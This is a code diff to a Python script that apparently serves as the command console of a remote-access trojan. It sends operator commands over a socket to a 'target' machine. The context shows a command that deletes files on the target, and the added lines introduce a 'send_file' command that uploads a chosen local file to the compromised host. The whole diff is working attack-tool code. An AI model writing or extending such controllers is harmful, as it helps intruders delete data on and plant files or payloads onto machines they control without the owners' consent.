@@ -56,11 +56,21 @@ while True:
 
     elif command == 'remove_file':
         conn.send(command.encode())
-        userInput = input(str(' >Set path with file and extension: '))
+        userInput = input(str(' >Set path with file and extention: '))
         conn.send(userInput.encode())
         log = conn.recv(5000) #receive an error if it was ocurred or the mesagge of succesfully removed file 
         log = log.decode()
         print(log)
+
+    elif command == 'send_file': #send data to target
+        conn.send(command.encode())
+        file = input(str(' >Set path with file and extention: ')) #idea: request the shipping path          
+        data = open(file, 'rb')        
+        fileName = str(os.path.basename(data.name))
+        fileData = data.read(7000) #increase number if the file is big; get name of the file with extention for send with the same name and extention
+        conn.send(fileName.encode())
+        conn.send(fileData)
+        print('\n{}[{}+{}] {} has been sent successfully...'.format(Fore.LIGHTWHITE_EX, Fore.LIGHTGREEN_EX,Fore.LIGHTWHITE_EX,fileName))
 
     elif command == 'exit':
         conn.send(command.encode())
